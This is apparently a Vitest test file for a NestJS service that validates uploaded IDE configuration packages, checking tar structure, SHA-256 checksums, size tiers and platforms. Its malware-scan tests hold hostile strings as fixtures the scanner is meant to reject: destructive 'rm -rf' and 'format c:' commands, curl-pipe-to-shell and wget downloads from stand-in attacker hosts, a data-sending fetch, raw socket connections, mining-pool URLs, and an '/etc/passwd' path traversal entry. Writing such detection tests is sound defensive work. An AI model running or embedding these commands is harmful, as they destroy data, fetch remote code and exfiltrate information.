import * as crypto from 'crypto';

import { Test, TestingModule } from '@nestjs/testing';

import * as tar from 'tar';
import { vi, describe, it, expect, beforeEach, afterEach } from 'vitest';

import { PackageValidatorService } from './package-validator.service';

vi.mock('tar');

describe('PackageValidatorService', () => {
  let service: PackageValidatorService;

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [PackageValidatorService],
    }).compile();

    service = module.get<PackageValidatorService>(PackageValidatorService);
  });

  afterEach(() => {
    vi.clearAllMocks();
  });

  describe('validateStructure', () => {
    it('should validate a valid .taptik package structure', async () => {
      // Create a mock buffer representing a valid tar.gz package
      const mockBuffer = Buffer.from('valid package content');
      const mockEntries = [
        { path: 'metadata.json', type: 'File' },
        { path: 'config/', type: 'Directory' },
        { path: 'config/settings.json', type: 'File' },
      ];

      // Mock tar.list to simulate valid package structure
      vi.mocked(tar.list).mockImplementation((options: any) => {
        const {onentry} = options;
        // Return a mock stream that implements the required methods
        const mockStream = {
          on: (event: string, handler: any) => {
            if (event === 'finish') {
              // Simulate entries being processed
              mockEntries.forEach(entry => onentry(entry));
              // Call finish handler after processing
              setTimeout(() => handler(), 0);
            }
            return mockStream;
          },
          once: (_event: string, _handler: any) => mockStream,
          emit: (_event: string, ..._args: any[]) => true,
          end: () => {},
          write: () => true,
          destroy: () => {},
          removeListener: (_event: string, _handler: any) => mockStream,
          removeAllListeners: (_event?: string) => mockStream,
          listeners: (_event: string) => [],
          listenerCount: (_event: string) => 0,
        };
        return mockStream as any;
      });

      const result = await service.validateStructure(mockBuffer);
      expect(result).toBe(true);
    });

    it('should reject package without metadata.json', async () => {
      const mockBuffer = Buffer.from('invalid package content');
      const mockEntries = [
        { path: 'config/', type: 'Directory' },
        { path: 'config/settings.json', type: 'File' },
      ];

      vi.mocked(tar.list).mockImplementation((options: any) => {
        const {onentry} = options;
        const mockStream = {
          on: (event: string, handler: any) => {
            if (event === 'finish') {
              mockEntries.forEach(entry => onentry(entry));
              setTimeout(() => handler(), 0);
            }
            return mockStream;
          },
          once: (_event: string, _handler: any) => mockStream,
          emit: (_event: string, ..._args: any[]) => true,
          end: () => {},
          write: () => true,
          destroy: () => {},
        };
        return mockStream as any;
      });

      const result = await service.validateStructure(mockBuffer);
      expect(result).toBe(false);
    });

    it('should reject empty packages', async () => {
      const mockBuffer = Buffer.from('');
      
      const result = await service.validateStructure(mockBuffer);
      expect(result).toBe(false);
    });

    it('should handle tar extraction errors gracefully', async () => {
      const mockBuffer = Buffer.from('corrupted package');
      
      vi.mocked(tar.list).mockImplementation(() => {
        const mockStream = {
          on: (event: string, handler: any) => {
            if (event === 'error') {
              setTimeout(() => handler(new Error('Invalid tar format')), 0);
            }
            return mockStream;
          },
          once: (_event: string, _handler: any) => mockStream,
          emit: (_event: string, ..._args: any[]) => true,
          end: () => {},
          write: () => true,
          destroy: () => {},
          removeListener: (_event: string, _handler: any) => mockStream,
          removeAllListeners: (_event?: string) => mockStream,
          listeners: (_event: string) => [],
          listenerCount: (_event: string) => 0,
        };
        return mockStream as any;
      });

      const result = await service.validateStructure(mockBuffer);
      expect(result).toBe(false);
    });

    it('should reject packages with suspicious file paths', async () => {
      const mockBuffer = Buffer.from('malicious package');
      const mockEntries = [
        { path: 'metadata.json', type: 'File' },
        { path: '../../../etc/passwd', type: 'File' }, // Path traversal attempt
      ];

      vi.mocked(tar.list).mockImplementation((options: any) => {
        const {onentry} = options;
        const mockStream = {
          on: (event: string, handler: any) => {
            if (event === 'finish') {
              mockEntries.forEach(entry => onentry(entry));
              setTimeout(() => handler(), 0);
            }
            return mockStream;
          },
          once: (_event: string, _handler: any) => mockStream,
          emit: (_event: string, ..._args: any[]) => true,
          end: () => {},
          write: () => true,
          destroy: () => {},
        };
        return mockStream as any;
      });

      const result = await service.validateStructure(mockBuffer);
      expect(result).toBe(false);
    });
  });

  describe('validateChecksum', () => {
    it('should validate correct checksum', async () => {
      const buffer = Buffer.from('test content');
      const hash = crypto.createHash('sha256');
      hash.update(buffer);
      const expectedChecksum = hash.digest('hex');

      const result = await service.validateChecksum(buffer, expectedChecksum);
      expect(result).toBe(true);
    });

    it('should reject incorrect checksum', async () => {
      const buffer = Buffer.from('test content');
      const incorrectChecksum = 'invalid_checksum_value';

      const result = await service.validateChecksum(buffer, incorrectChecksum);
      expect(result).toBe(false);
    });

    it('should handle empty buffer', async () => {
      const buffer = Buffer.from('');
      const hash = crypto.createHash('sha256');
      hash.update(buffer);
      const expectedChecksum = hash.digest('hex');

      const result = await service.validateChecksum(buffer, expectedChecksum);
      expect(result).toBe(true);
    });
  });

  describe('calculateChecksum', () => {
    it('should calculate SHA256 checksum correctly', async () => {
      const buffer = Buffer.from('test content');
      const expectedHash = crypto.createHash('sha256').update(buffer).digest('hex');

      const result = await service.calculateChecksum(buffer);
      expect(result).toBe(expectedHash);
    });

    it('should produce different checksums for different content', async () => {
      const buffer1 = Buffer.from('content1');
      const buffer2 = Buffer.from('content2');

      const checksum1 = await service.calculateChecksum(buffer1);
      const checksum2 = await service.calculateChecksum(buffer2);

      expect(checksum1).not.toBe(checksum2);
    });
  });

  describe('validateSize', () => {
    it('should accept files within free tier limits', async () => {
      const size = 10 * 1024 * 1024; // 10MB
      const result = await service.validateSize(size, 'free');
      expect(result).toBe(true);
    });

    it('should reject files exceeding free tier limits', async () => {
      const size = 60 * 1024 * 1024; // 60MB
      const result = await service.validateSize(size, 'free');
      expect(result).toBe(false);
    });

    it('should accept larger files for pro tier', async () => {
      const size = 400 * 1024 * 1024; // 400MB
      const result = await service.validateSize(size, 'pro');
      expect(result).toBe(true);
    });

    it('should reject files exceeding pro tier limits', async () => {
      const size = 600 * 1024 * 1024; // 600MB
      const result = await service.validateSize(size, 'pro');
      expect(result).toBe(false);
    });

    it('should handle zero size', async () => {
      const result = await service.validateSize(0, 'free');
      expect(result).toBe(true);
    });

    it('should handle negative size', async () => {
      const result = await service.validateSize(-1, 'free');
      expect(result).toBe(false);
    });
  });

  describe('validatePlatform', () => {
    it('should accept valid platforms', async () => {
      const validPlatforms = ['claude-code', 'kiro-ide', 'cursor-ide'];
      
      /* eslint-disable no-await-in-loop */
      for (const platform of validPlatforms) {
        const result = await service.validatePlatform(platform);
        expect(result).toBe(true);
      }
      /* eslint-enable no-await-in-loop */
    });

    it('should reject invalid platforms', async () => {
      const invalidPlatforms = ['invalid-ide', 'unknown', '', 'CLAUDE-CODE'];
      
      /* eslint-disable no-await-in-loop */
      for (const platform of invalidPlatforms) {
        const result = await service.validatePlatform(platform);
        expect(result).toBe(false);
      }
      /* eslint-enable no-await-in-loop */
    });
  });

  describe('scanForMalware', () => {
    it('should detect suspicious executable patterns', async () => {
      const suspiciousPatterns = [
        Buffer.from('#!/bin/bash\nrm -rf /'),
        Buffer.from('exec("os.system(\'rm -rf /\')")'),
        Buffer.from('require("child_process").exec("format c:")'),
        Buffer.from('eval(atob("malicious_base64"))'),
      ];

      /* eslint-disable no-await-in-loop */
      for (const buffer of suspiciousPatterns) {
        const result = await service.scanForMalware(buffer);
        expect(result).toBe(false);
      }
      /* eslint-enable no-await-in-loop */
    });

    it('should pass clean content', async () => {
      const cleanContent = Buffer.from(JSON.stringify({
        settings: {
          theme: 'dark',
          fontSize: 14,
        }
      }));

      const result = await service.scanForMalware(cleanContent);
      expect(result).toBe(true);
    });

    it('should detect potential shell injection patterns', async () => {
      const injectionPatterns = [
        Buffer.from('`rm -rf ${HOME}`'),
        Buffer.from('$(curl http://malicious.com/script.sh | sh)'),
        Buffer.from('system("wget http://evil.com/backdoor")'),
      ];

      /* eslint-disable no-await-in-loop */
      for (const buffer of injectionPatterns) {
        const result = await service.scanForMalware(buffer);
        expect(result).toBe(false);
      }
      /* eslint-enable no-await-in-loop */
    });

    it('should detect suspicious network patterns', async () => {
      const networkPatterns = [
        Buffer.from('new WebSocket("ws://attacker.com:4444")'),
        Buffer.from('fetch("http://evil.com/steal-data").then('),
        Buffer.from('require("net").connect(1337, "hacker.com")'),
      ];

      /* eslint-disable no-await-in-loop */
      for (const buffer of networkPatterns) {
        const result = await service.scanForMalware(buffer);
        expect(result).toBe(false);
      }
      /* eslint-enable no-await-in-loop */
    });

    it('should handle empty buffer', async () => {
      const result = await service.scanForMalware(Buffer.from(''));
      expect(result).toBe(true);
    });

    it('should detect crypto mining patterns', async () => {
      const miningPatterns = [
        Buffer.from('CoinHive.Anonymous'),
        Buffer.from('cryptonight_hash'),
        Buffer.from('stratum+tcp://pool.minexmr.com'),
      ];

      /* eslint-disable no-await-in-loop */
      for (const buffer of miningPatterns) {
        const result = await service.scanForMalware(buffer);
        expect(result).toBe(false);
      }
      /* eslint-enable no-await-in-loop */
    });
  });

  describe('validatePackage', () => {
    it('should perform complete package validation', async () => {
      const mockBuffer = Buffer.from('valid package');
      const mockMetadata = {
        platform: 'claude-code',
        version: '1.0.0',
        checksum: crypto.createHash('sha256').update(mockBuffer).digest('hex'),
      };

      // Mock validateStructure to return true
      vi.spyOn(service, 'validateStructure').mockResolvedValue(true);
      vi.spyOn(service, 'scanForMalware').mockResolvedValue(true);

      const result = await service.validatePackage(mockBuffer, mockMetadata, 'free');
      
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should collect all validation errors', async () => {
      const mockBuffer = Buffer.from('x'.repeat(100 * 1024 * 1024)); // 100MB
      const mockMetadata = {
        platform: 'invalid-platform',
        version: 'not-semver',
        checksum: 'wrong-checksum',
      };

      vi.spyOn(service, 'validateStructure').mockResolvedValue(false);
      vi.spyOn(service, 'scanForMalware').mockResolvedValue(false);

      const result = await service.validatePackage(mockBuffer, mockMetadata, 'free');
      
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors.some(e => e.includes('structure'))).toBe(true);
      expect(result.errors.some(e => e.includes('size'))).toBe(true);
      expect(result.errors.some(e => e.includes('platform'))).toBe(true);
      expect(result.errors.some(e => e.includes('malware'))).toBe(true);
    });
  });
});